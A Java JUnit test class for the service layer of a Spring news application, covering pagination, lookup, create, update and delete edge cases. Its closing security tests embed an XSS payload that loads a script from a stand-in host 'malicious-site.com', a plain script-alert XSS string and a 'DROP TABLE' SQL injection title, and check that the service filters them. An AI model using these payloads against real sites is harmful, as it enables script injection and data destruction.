package com.demo.service.impl;

import com.demo.dao.NewsDao;
import com.demo.entity.News;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.PageImpl;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Pageable;
import org.springframework.dao.DataIntegrityViolationException;
import org.springframework.dao.PessimisticLockingFailureException;
import org.hibernate.LazyInitializationException;
import org.mockito.ArgumentCaptor;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;
import javax.persistence.EntityNotFoundException;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

class NewsServiceImplTest {

    @Mock
    private NewsDao newsDao;

    @InjectMocks
    private NewsServiceImpl newsService;

    private News testNews;
    private List<News> newsList;
    private Page<News> newsPage;
    private LocalDateTime now;

    @BeforeEach
    void setUp() {
        MockitoAnnotations.initMocks(this);
        
        now = LocalDateTime.now();

        // 创建测试新闻
        testNews = new News();
        testNews.setNewsID(1);
        testNews.setTitle("测试新闻标题");
        testNews.setContent("这是一条测试新闻的内容");
        testNews.setTime(now);
        
        // 创建新闻列表和分页
        newsList = new ArrayList<>();
        newsList.add(testNews);
        
        newsPage = new PageImpl<>(newsList);
    }

    // 分页查询所有新闻测试

    @Test
    @DisplayName("测试分页查询所有新闻 - 正常情况")
    void findAll_Pagination() {
        // 创建分页请求
        Pageable pageable = PageRequest.of(0, 10);
        
        // 设置模拟行为
        when(newsDao.findAll(pageable)).thenReturn(newsPage);
        
        // 执行测试
        Page<News> result = newsService.findAll(pageable);
        
        // 验证结果
        assertNotNull(result);
        assertEquals(1, result.getTotalElements());
        assertEquals(testNews.getNewsID(), result.getContent().get(0).getNewsID());
        assertEquals(testNews.getTitle(), result.getContent().get(0).getTitle());
    }
    
    @Test
    @DisplayName("测试分页查询所有新闻 - 空结果")
    void findAll_Pagination_Empty() {
        // 创建分页请求
        Pageable pageable = PageRequest.of(0, 10);
        
        // 创建空页面
        Page<News> emptyPage = new PageImpl<>(new ArrayList<>());
        
        // 设置模拟行为
        when(newsDao.findAll(pageable)).thenReturn(emptyPage);
        
        // 执行测试
        Page<News> result = newsService.findAll(pageable);
        
        // 验证结果
        assertNotNull(result);
        assertEquals(0, result.getTotalElements());
        assertTrue(result.getContent().isEmpty());
    }
    
    @Test
    @DisplayName("测试分页查询所有新闻 - 页码超出范围")
    void findAll_Pagination_OutOfRange() {
        // 创建分页请求 - 页码超出范围
        Pageable pageable = PageRequest.of(100, 10);
        
        // 创建空页面
        Page<News> emptyPage = new PageImpl<>(new ArrayList<>());
        
        // 设置模拟行为
        when(newsDao.findAll(pageable)).thenReturn(emptyPage);
        
        // 执行测试
        Page<News> result = newsService.findAll(pageable);
        
        // 验证结果
        assertNotNull(result);
        assertEquals(0, result.getTotalElements());
        assertTrue(result.getContent().isEmpty());
    }
    
    @Test
    @DisplayName("测试分页查询所有新闻 - 每页大小为1")
    void findAll_Pagination_SizeOne() {
        // 创建分页请求 - 每页大小为1
        Pageable pageable = PageRequest.of(0, 1);
        
        // 创建页面
        Page<News> smallPage = new PageImpl<>(newsList.subList(0, 1), pageable, newsList.size());
        
        // 设置模拟行为
        when(newsDao.findAll(pageable)).thenReturn(smallPage);
        
        // 执行测试
        Page<News> result = newsService.findAll(pageable);
        
        // 验证结果
        assertNotNull(result);
        assertEquals(1, result.getTotalElements());
        assertEquals(1, result.getContent().size());
        assertEquals(testNews.getNewsID(), result.getContent().get(0).getNewsID());
    }
    
    @Test
    @DisplayName("测试分页查询所有新闻 - 每页大小为0")
    void findAll_Pagination_SizeZero() {
        // 创建分页请求 - 每页大小为1（最小有效值）
        Pageable pageable = PageRequest.of(0, 1);
        
        // 创建空页面
        Page<News> emptyPage = new PageImpl<>(new ArrayList<>());
        
        // 设置模拟行为
        when(newsDao.findAll(pageable)).thenReturn(emptyPage);
        
        // 执行测试
        Page<News> result = newsService.findAll(pageable);
        
        // 验证结果
        assertNotNull(result);
        assertEquals(0, result.getTotalElements());
        assertTrue(result.getContent().isEmpty());
    }
    
    // 根据ID查询新闻测试
    
    @Test
    @DisplayName("测试根据ID查询新闻 - 新闻存在")
    void findById_NewsExists() {
        // 设置模拟行为
        when(newsDao.getOne(1)).thenReturn(testNews);
        
        // 执行测试
        News result = newsService.findById(1);
        
        // 验证结果
        assertNotNull(result);
        assertEquals(1, result.getNewsID());
        assertEquals("测试新闻标题", result.getTitle());
    }
    
    @Test
    @DisplayName("测试根据ID查询新闻 - 新闻不存在")
    void findById_NewsNotExists() {
        // 设置模拟行为 - 不存在的新闻ID抛出异常
        when(newsDao.getOne(999)).thenThrow(new javax.persistence.EntityNotFoundException("News not found"));
        
        // 执行测试并验证异常
        assertThrows(javax.persistence.EntityNotFoundException.class, () -> {
            newsService.findById(999);
        });
    }
    
    @Test
    @DisplayName("测试根据ID查询新闻 - ID为负数")
    void findById_NegativeID() {
        // 设置模拟行为 - 负数ID抛出异常
        when(newsDao.getOne(-1)).thenThrow(new IllegalArgumentException("ID must be positive"));
        
        // 执行测试并验证异常
        assertThrows(IllegalArgumentException.class, () -> {
            newsService.findById(-1);
        });
    }
    
    @Test
    @DisplayName("测试根据ID查询新闻 - ID为0")
    void findById_ZeroID() {
        // 设置模拟行为 - ID为0抛出异常
        when(newsDao.getOne(0)).thenThrow(new IllegalArgumentException("ID must be positive"));
        
        // 执行测试并验证异常
        assertThrows(IllegalArgumentException.class, () -> {
            newsService.findById(0);
        });
    }
    
    @Test
    @DisplayName("测试根据ID查询新闻 - getOne抛出状态异常")
    void findById_EntityNotFound_StateException() {
        // 设置模拟行为 - 模拟JPA在懒加载时的异常
        when(newsDao.getOne(999)).thenThrow(new LazyInitializationException("Could not initialize proxy"));
        
        try {
            // 执行测试
            News result = newsService.findById(999);
            
            // 如果执行到这里，说明异常被捕获但没有正确处理
            if (result == null) {
                // 如果返回null，至少表明系统捕获了异常并返回了null，但缺乏更好的错误信息
                System.out.println("警告：系统捕获了异常但只是返回null，应该抛出自定义异常或提供更多信息");
            } else {
                // 如果返回了非null结果，说明系统完全忽略了异常
                fail("系统应该捕获并处理懒加载异常，但完全忽略了异常");
            }
        } catch (LazyInitializationException e) {
            // 如果原始异常被直接传播，说明系统没有捕获和转换异常
            fail("系统应该捕获懒加载异常并转换为友好的业务异常，但直接传播了底层异常");
        } catch (Exception e) {
            // 如果抛出了其他异常，检查是否是合理的业务异常
            if (!(e.getMessage() != null && (
                e.getMessage().contains("不存在") || 
                e.getMessage().contains("找不到") || 
                e.getMessage().contains("不可用")))) {
                fail("系统应该抛出带有明确错误消息的业务异常，说明新闻不存在");
            }
        }
    }
    
    // 创建新闻测试
    
    @Test
    @DisplayName("测试创建新闻 - 正常情况")
    void create_Success() {
        // 创建一个新新闻
        News newNews = new News();
        newNews.setTitle("新创建的新闻");
        newNews.setContent("这是新创建的新闻内容");
        newNews.setTime(now);
        
        // 设置模拟行为 - 保存后返回带ID的新闻
        News savedNews = new News();
        savedNews.setNewsID(2);
        savedNews.setTitle("新创建的新闻");
        savedNews.setContent("这是新创建的新闻内容");
        savedNews.setTime(now);
        
        when(newsDao.save(any(News.class))).thenReturn(savedNews);
        
        // 执行测试
        int result = newsService.create(newNews);
        
        // 验证结果
        assertEquals(2, result);
        verify(newsDao, times(1)).save(newNews);
    }
    
    @Test
    @DisplayName("测试创建新闻 - ID字段已设置")
    void create_WithID() {
        // 创建一个带ID的新新闻
        News newNews = new News();
        newNews.setNewsID(100); // 预设ID
        newNews.setTitle("带ID的新新闻");
        newNews.setContent("这是带ID的新新闻内容");
        newNews.setTime(now);
        
        // 设置模拟行为 - 返回原始对象，保留其ID
        when(newsDao.save(newNews)).thenReturn(newNews);
        
        // 执行测试
        int result = newsService.create(newNews);
        
        // 验证结果 - 应该返回预设的ID
        assertEquals(100, result);
        verify(newsDao, times(1)).save(newNews);
    }
    
    @Test
    @DisplayName("测试创建新闻 - 标题为null")
    void create_NullTitle() {
        // 创建标题为null的新闻
        News newNews = new News();
        newNews.setTitle(null);
        newNews.setContent("这是内容");
        newNews.setTime(now);
        
        // 设置模拟行为 - 保存后返回带ID的新闻
        News savedNews = new News();
        savedNews.setNewsID(2);
        savedNews.setTitle(null);
        savedNews.setContent("这是内容");
        savedNews.setTime(now);
        
        when(newsDao.save(any(News.class))).thenReturn(savedNews);
        
        // 执行测试
        int result = newsService.create(newNews);
        
        // 验证结果 - 服务层没有验证标题不能为null
        assertEquals(2, result);
        verify(newsDao, times(1)).save(newNews);
    }
    
    @Test
    @DisplayName("测试创建新闻 - 内容为null")
    void create_NullContent() {
        // 创建内容为null的新闻
        News newNews = new News();
        newNews.setTitle("这是标题");
        newNews.setContent(null);
        newNews.setTime(now);
        
        // 设置模拟行为 - 保存后返回带ID的新闻
        News savedNews = new News();
        savedNews.setNewsID(2);
        savedNews.setTitle("这是标题");
        savedNews.setContent(null);
        savedNews.setTime(now);
        
        when(newsDao.save(any(News.class))).thenReturn(savedNews);
        
        // 执行测试
        int result = newsService.create(newNews);
        
        // 验证结果 - 服务层没有验证内容不能为null
        assertEquals(2, result);
        verify(newsDao, times(1)).save(newNews);
    }
    
    @Test
    @DisplayName("测试创建新闻 - 时间为null")
    void create_NullTime() {
        // 创建时间为null的新闻
        News newNews = new News();
        newNews.setTitle("这是标题");
        newNews.setContent("这是内容");
        newNews.setTime(null);
        
        // 设置模拟行为 - 保存后返回带ID的新闻
        News savedNews = new News();
        savedNews.setNewsID(2);
        savedNews.setTitle("这是标题");
        savedNews.setContent("这是内容");
        savedNews.setTime(null);
        
        when(newsDao.save(any(News.class))).thenReturn(savedNews);
        
        // 执行测试
        int result = newsService.create(newNews);
        
        // 验证结果 - 服务层没有验证时间不能为null
        assertEquals(2, result);
        verify(newsDao, times(1)).save(newNews);
    }
    
    @Test
    @DisplayName("测试创建新闻 - 标题超长")
    void create_TitleTooLong() {
        // 创建标题超长的新闻（假设有限制，实际上代码中没有显式限制）
        StringBuilder longTitle = new StringBuilder();
        for (int i = 0; i < 1000; i++) {
            longTitle.append("标题");
        }
        
        News newNews = new News();
        newNews.setTitle(longTitle.toString());
        newNews.setContent("这是内容");
        newNews.setTime(now);
        
        // 设置模拟行为 - 假设DAO会拒绝过长的标题
        when(newsDao.save(newNews)).thenThrow(new IllegalArgumentException("Title too long"));
        
        // 执行测试并验证异常
        assertThrows(IllegalArgumentException.class, () -> {
            newsService.create(newNews);
        });
    }
    
    @Test
    @DisplayName("测试创建新闻 - 重复ID新闻")
    void create_DuplicateID() {
        // 创建一个ID与已存在新闻相同的新闻
        News duplicateNews = new News();
        duplicateNews.setNewsID(1); // 与testNews相同
        duplicateNews.setTitle("重复ID的新闻");
        duplicateNews.setContent("这是一条ID重复的新闻");
        duplicateNews.setTime(now);
        
        // 设置模拟行为 - 模拟违反唯一约束异常
        when(newsDao.save(duplicateNews)).thenThrow(new DataIntegrityViolationException("Duplicate entry for key 'PRIMARY'"));
        
        // 执行测试并验证异常 - 服务层应该处理此异常
        assertThrows(DataIntegrityViolationException.class, () -> {
            newsService.create(duplicateNews);
        });
    }
    
    // 删除新闻测试
    
    @Test
    @DisplayName("测试删除新闻 - 正常情况")
    void delById_Success() {
        // 执行测试
        newsService.delById(1);
        
        // 验证行为
        verify(newsDao, times(1)).deleteById(1);
    }
    
    @Test
    @DisplayName("测试删除新闻 - 新闻不存在")
    void delById_NewsNotExists() {
        // 设置模拟行为 - 删除不存在的新闻时抛出异常
        doThrow(new IllegalArgumentException("News not found")).when(newsDao).deleteById(999);
        
        // 执行测试并验证异常
        assertThrows(IllegalArgumentException.class, () -> {
            newsService.delById(999);
        });
        
        // 验证行为
        verify(newsDao, times(1)).deleteById(999);
    }
    
    @Test
    @DisplayName("测试删除新闻 - ID为负数")
    void delById_NegativeID() {
        // 设置模拟行为 - 删除ID为负数的新闻时抛出异常
        doThrow(new IllegalArgumentException("ID must be positive")).when(newsDao).deleteById(-1);
        
        // 执行测试并验证异常
        assertThrows(IllegalArgumentException.class, () -> {
            newsService.delById(-1);
        });
        
        // 验证行为
        verify(newsDao, times(1)).deleteById(-1);
    }
    
    @Test
    @DisplayName("测试删除新闻 - ID为0")
    void delById_ZeroID() {
        // 设置模拟行为 - 删除ID为0的新闻时抛出异常
        doThrow(new IllegalArgumentException("ID must be positive")).when(newsDao).deleteById(0);
        
        // 执行测试并验证异常
        assertThrows(IllegalArgumentException.class, () -> {
            newsService.delById(0);
        });
        
        // 验证行为
        verify(newsDao, times(1)).deleteById(0);
    }
    
    @Test
    @DisplayName("测试删除新闻 - 数据库锁定异常")
    void delById_PessimisticLockException() {
        // 设置模拟行为 - 模拟并发访问导致的锁定异常
        doThrow(new PessimisticLockingFailureException("Row was locked by another transaction")).when(newsDao).deleteById(1);
        
        // 执行测试并验证异常 - 服务层应该处理此异常
        assertThrows(PessimisticLockingFailureException.class, () -> {
            newsService.delById(1);
        });
    }
    
    // 更新新闻测试
    
    @Test
    @DisplayName("测试更新新闻 - 正常情况")
    void update_Success() {
        // 更新测试新闻
        testNews.setTitle("更新后的标题");
        testNews.setContent("更新后的内容");
        testNews.setTime(now.plusDays(1));
        
        // 执行测试
        newsService.update(testNews);
        
        // 验证行为
        verify(newsDao, times(1)).save(testNews);
    }
    
    @Test
    @DisplayName("测试更新新闻 - 新闻不存在")
    void update_NewsNotExists() {
        // 创建一个不存在的新闻
        News nonExistentNews = new News();
        nonExistentNews.setNewsID(999);
        nonExistentNews.setTitle("不存在的新闻");
        nonExistentNews.setContent("这是不存在的新闻内容");
        nonExistentNews.setTime(now);
        
        // 设置模拟行为 - 允许更新不存在的新闻（实际上会创建新新闻）
        when(newsDao.save(nonExistentNews)).thenReturn(nonExistentNews);
        
        // 执行测试
        newsService.update(nonExistentNews);
        
        // 验证行为
        verify(newsDao, times(1)).save(nonExistentNews);
    }
    
    @Test
    @DisplayName("测试更新新闻 - ID为null")
    void update_NullID() {
        // 创建一个ID为null的新闻
        News newsWithNullID = new News();
        // 不设置ID
        newsWithNullID.setTitle("ID为null的新闻");
        newsWithNullID.setContent("这是ID为null的新闻内容");
        newsWithNullID.setTime(now);
        
        // 设置模拟行为 - 保存时会自动生成ID（实际上会创建新新闻）
        News savedNews = new News();
        savedNews.setNewsID(2);
        savedNews.setTitle("ID为null的新闻");
        savedNews.setContent("这是ID为null的新闻内容");
        savedNews.setTime(now);
        
        when(newsDao.save(newsWithNullID)).thenReturn(savedNews);
        
        // 执行测试
        newsService.update(newsWithNullID);
        
        // 验证行为
        verify(newsDao, times(1)).save(newsWithNullID);
    }
    
    @Test
    @DisplayName("测试更新新闻 - 标题为null")
    void update_NullTitle() {
        // 更新测试新闻的标题为null
        testNews.setTitle(null);
        
        // 执行测试
        newsService.update(testNews);
        
        // 验证行为 - 服务层没有验证标题不能为null
        verify(newsDao, times(1)).save(testNews);
    }
    
    @Test
    @DisplayName("测试更新新闻 - 内容为null")
    void update_NullContent() {
        // 更新测试新闻的内容为null
        testNews.setContent(null);
        
        // 执行测试
        newsService.update(testNews);
        
        // 验证行为 - 服务层没有验证内容不能为null
        verify(newsDao, times(1)).save(testNews);
    }
    
    @Test
    @DisplayName("测试更新新闻 - 时间为null")
    void update_NullTime() {
        // 更新测试新闻的时间为null
        testNews.setTime(null);
        
        // 执行测试
        newsService.update(testNews);
        
        // 验证行为 - 服务层没有验证时间不能为null
        verify(newsDao, times(1)).save(testNews);
    }
    
    @Test
    @DisplayName("测试更新新闻 - 标题超长")
    void update_TitleTooLong() {
        // 更新测试新闻的标题超长（假设有限制，实际上代码中没有显式限制）
        StringBuilder longTitle = new StringBuilder();
        for (int i = 0; i < 1000; i++) {
            longTitle.append("标题");
        }
        
        testNews.setTitle(longTitle.toString());
        
        // 设置模拟行为 - 假设DAO会拒绝过长的标题
        when(newsDao.save(testNews)).thenThrow(new IllegalArgumentException("Title too long"));
        
        // 执行测试并验证异常
        assertThrows(IllegalArgumentException.class, () -> {
            newsService.update(testNews);
        });
    }
    
    @Test
    @DisplayName("测试更新不存在的新闻ID - 应抛出异常")
    void update_NonExistentID_ShouldThrowException() {
        // 创建一个不存在ID的新闻
        News nonExistentNews = new News();
        nonExistentNews.setNewsID(999);
        nonExistentNews.setTitle("不存在的新闻");
        nonExistentNews.setContent("这是一条不存在ID的新闻");
        nonExistentNews.setTime(now);
        
        // 设置模拟行为 - 模拟找不到实体的异常
        when(newsDao.save(nonExistentNews)).thenThrow(new EntityNotFoundException("Unable to find news with id 999"));
        
        // 执行测试并验证异常 - 服务层应该处理或传播此异常
        assertThrows(EntityNotFoundException.class, () -> {
            newsService.update(nonExistentNews);
        });
    }
    
    @Test
    @DisplayName("测试分页查询 - 未处理的IllegalArgumentException")
    void findAll_Pagination_UnhandledException() {
        // 创建带有正确参数的分页请求
        Pageable validPageable = PageRequest.of(0, 10);
        
        // 设置模拟行为 - 模拟分页参数问题引发的异常
        String errorMsg = "Page index must not be less than zero";
        when(newsDao.findAll(validPageable)).thenThrow(
            new IllegalArgumentException(errorMsg)
        );
        
        // 执行测试并验证异常 - 服务层应该捕获并处理此异常
        Exception exception = assertThrows(IllegalArgumentException.class, () -> {
            newsService.findAll(validPageable);
        });
        
        // 验证异常消息
        assertEquals(errorMsg, exception.getMessage());
    }
    
    @Test
    @DisplayName("测试XSS漏洞 - 过滤标签和脚本")
    void create_XSSVulnerability() {
        // 创建包含XSS脚本的新闻
        News xssNews = new News();
        xssNews.setTitle("XSS测试");
        xssNews.setContent("<script>alert('XSS')</script>这是一条恶意新闻内容");
        xssNews.setTime(now);
        
        // 设置模拟行为
        News savedNews = new News();
        savedNews.setNewsID(2);
        savedNews.setTitle("XSS测试");
        savedNews.setContent("<script>alert('XSS')</script>这是一条恶意新闻内容"); // 未过滤恶意内容
        savedNews.setTime(now);
        
        when(newsDao.save(any(News.class))).thenReturn(savedNews);
        
        // 执行测试
        int result = newsService.create(xssNews);
        
        // 验证结果 - 系统应该对内容进行HTML转义或过滤
        ArgumentCaptor<News> newsCaptor = ArgumentCaptor.forClass(News.class);
        verify(newsDao).save(newsCaptor.capture());
        News capturedNews = newsCaptor.getValue();
        
        // 验证系统是否过滤了脚本标签，如果没有过滤则测试失败
        if (capturedNews.getContent().contains("<script>") || capturedNews.getContent().contains("</script>")) {
            fail("系统未能过滤XSS脚本标签，存在安全漏洞");
        }
    }
    
    @Test
    @DisplayName("测试XSS高危漏洞 - iframe远程脚本注入")
    void create_DangerousXSSVulnerability() {
        // 创建包含高危XSS脚本的新闻（iframe远程脚本）
        String maliciousContent = "<iframe src=\"javascript:alert(`xss`)\" onload=\"var script=document.createElement('script');script.src='https://malicious-site.com/steal.js';document.body.appendChild(script);\"></iframe>";
        News xssNews = new News();
        xssNews.setTitle("高危XSS测试");
        xssNews.setContent(maliciousContent);
        xssNews.setTime(now);
        
        // 设置模拟行为
        News savedNews = new News();
        savedNews.setNewsID(3);
        savedNews.setTitle("高危XSS测试");
        savedNews.setContent(maliciousContent); // 未过滤恶意内容
        savedNews.setTime(now);
        
        when(newsDao.save(any(News.class))).thenReturn(savedNews);
        
        // 执行测试
        int result = newsService.create(xssNews);
        
        // 验证结果 - 系统应该对内容进行HTML转义或过滤
        ArgumentCaptor<News> newsCaptor = ArgumentCaptor.forClass(News.class);
        verify(newsDao).save(newsCaptor.capture());
        News capturedNews = newsCaptor.getValue();
        
        // 检查是否存在危险标签和属性
        boolean hasIframe = capturedNews.getContent().contains("<iframe");
        boolean hasJavascript = capturedNews.getContent().contains("javascript:");
        boolean hasOnload = capturedNews.getContent().contains("onload=");
        boolean hasMaliciousSite = capturedNews.getContent().contains("malicious-site.com");
        
        // 如果任何危险内容未被过滤，则测试失败
        if (hasIframe || hasJavascript || hasOnload || hasMaliciousSite) {
            fail("系统存在高危XSS漏洞，未能过滤iframe、javascript或远程脚本加载代码");
        }
    }
    
    @Test
    @DisplayName("测试SQL注入漏洞 - 标题中的SQL注入")
    void create_SQLInjectionVulnerability() {
        // 创建包含SQL注入的新闻
        String sqlInjectionTitle = "'; DROP TABLE news; --";
        News sqlInjectionNews = new News();
        sqlInjectionNews.setTitle(sqlInjectionTitle);
        sqlInjectionNews.setContent("这是SQL注入测试内容");
        sqlInjectionNews.setTime(now);
        
        // 设置模拟行为
        News savedNews = new News();
        savedNews.setNewsID(4);
        savedNews.setTitle(sqlInjectionTitle); // SQL注入未被过滤
        savedNews.setContent("这是SQL注入测试内容");
        savedNews.setTime(now);
        
        when(newsDao.save(any(News.class))).thenReturn(savedNews);
        
        try {
            // 执行测试
            int result = newsService.create(sqlInjectionNews);
            
            // 验证系统是否过滤了SQL注入
            ArgumentCaptor<News> newsCaptor = ArgumentCaptor.forClass(News.class);
            verify(newsDao).save(newsCaptor.capture());
            News capturedNews = newsCaptor.getValue();
            
            // 检查是否包含SQL注入特征
            if (capturedNews.getTitle().contains("DROP TABLE") || 
                capturedNews.getTitle().contains("--") ||
                capturedNews.getTitle().contains("';")) {
                fail("系统存在SQL注入漏洞，未能过滤SQL关键字和特殊字符");
            }
        } catch (IllegalArgumentException e) {
            // 如果系统正确实现，会捕获并拒绝可疑的SQL注入
            assertTrue(e.getMessage().contains("输入不合法") || 
                       e.getMessage().contains("包含非法字符"),
                      "系统应该识别并拒绝SQL注入尝试");
        }
    }
    
    @Test
    @DisplayName("测试update方法 - 传入null新闻对象应抛出异常")
    void update_NullNews_ShouldThrowException() {
        try {
            // 执行测试 - 传入null新闻对象
            newsService.update(null);
            
            // 如果执行到这里，表示没有抛出异常，测试失败
            fail("系统应该检查news参数非null并抛出相应异常，但未进行检查");
        } catch (NullPointerException e) {
            // 捕获到NullPointerException，但需要检查是否是系统主动抛出的
            if (e.getMessage() == null || e.getMessage().isEmpty()) {
                // 如果异常没有消息，说明是JVM默认的NPE，而非系统主动检查并抛出的
                fail("系统应该主动检查并抛出带有明确错误消息的NullPointerException，而不是在访问null对象时才抛出默认NPE");
            }
        }
    }
} 